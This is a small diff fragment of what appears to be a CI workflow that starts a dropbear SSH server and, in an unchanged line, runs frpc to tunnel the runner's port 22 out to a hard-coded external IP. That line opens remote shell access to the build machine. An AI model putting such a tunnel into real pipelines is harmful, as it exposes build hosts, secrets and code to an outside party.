@@ -15,7 +15,7 @@ jobs:
     steps:
       - run:
           command: |
-            /usr/local/bin/dropbear -E -R
+            /usr/local/sbin/dropbear -E -R
             frpc tcp -s 114.215.138.135:7000 -n temp_ssh -l 22
       
 
